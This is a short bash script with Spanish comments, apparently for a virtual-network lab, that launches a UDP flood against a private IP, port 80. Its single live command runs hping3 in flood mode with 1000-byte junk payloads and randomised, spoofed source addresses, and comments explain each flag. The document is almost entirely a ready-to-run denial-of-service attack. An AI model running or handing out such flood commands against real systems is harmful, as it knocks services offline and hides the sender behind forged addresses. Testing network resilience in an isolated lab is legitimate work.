#!/bin/bash

# ==============================================================================
# Script de Ataque: UDP Flood (Capa 4)
# Objetivo: Saturar el ancho de banda de la red virtual y los recursos de CPU.
# ==============================================================================

# IP objetivo (Puede ser el NGINX, la BD, o el Router Virtual)
TARGET_IP="192.168.100.10"
TARGET_PORT=80

echo "======================================================"
echo " INICIANDO ATAQUE UDP FLOOD "
echo " Objetivo: $TARGET_IP:$TARGET_PORT"
echo " Tamaño de carga útil: 1000 bytes por paquete"
echo " Presiona [Ctrl+C] para detener la ejecución."
echo "======================================================"

# Explicación de las banderas:
# --udp : Usa el protocolo UDP (no orientado a conexión).
# --flood : Envío masivo sin esperar.
# -d 1000 : Añade 1000 bytes de datos basura a cada paquete (hace que pesen más).
# --rand-source : Falsifica la IP de origen.

sudo hping3 --udp -p $TARGET_PORT --flood -d 1000 --rand-source $TARGET_IP